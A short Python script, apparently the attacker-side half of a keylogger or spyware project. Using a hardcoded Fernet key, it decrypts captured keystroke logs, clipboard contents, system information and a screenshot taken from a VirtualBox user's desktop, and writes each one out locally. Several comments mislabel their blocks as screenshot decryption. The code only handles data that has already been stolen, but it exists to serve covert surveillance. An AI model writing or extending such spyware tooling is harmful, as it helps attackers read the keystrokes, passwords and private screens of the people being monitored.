from cryptography.fernet import Fernet

key = "dvqlXrCqtPmOyI7oyzlfVK0dDI_r9UwTtIJ5I46dVqw="

system_information_e = 'C:\\Users\\vboxuser\\Desktop\\MAIN_X\\LAST\\exit\\e_systeminfo.txt'
clipboard_information_e = 'C:\\Users\\vboxuser\\Desktop\\MAIN_X\\LAST\\exit\\e_clipboard.txt'
keys_information_e = 'C:\\Users\\vboxuser\\Desktop\\MAIN_X\\LAST\\exit\\e_key_log.txt'
screenshot_information_e = 'C:\\Users\\vboxuser\\Desktop\\MAIN_X\\LAST\\exit\\e_screenshot.png'

fernet = Fernet(key)
   
# key information decryption    
with open(keys_information_e, 'rb') as f:
    data = f.read()
decrypted = fernet.decrypt(data)
with open("d_key_log.txt", 'ab') as f:
    f.write(decrypted)
    
# Screenshot decryption    
with open(clipboard_information_e, 'rb') as f:
    data = f.read()
decrypted = fernet.decrypt(data)
with open("d_clipboard.txt", 'ab') as f:
    f.write(decrypted)
    
# Screenshot decryption    
with open(system_information_e, 'rb') as f:
    data = f.read()
decrypted = fernet.decrypt(data)
with open("d_systeminfo.txt", 'ab') as f:
    f.write(decrypted)

# Screenshot decryption    
with open(screenshot_information_e, 'rb') as f:
    data = f.read()
decrypted = fernet.decrypt(data)
with open("d_screenshot.png", 'ab') as f:
    f.write(decrypted)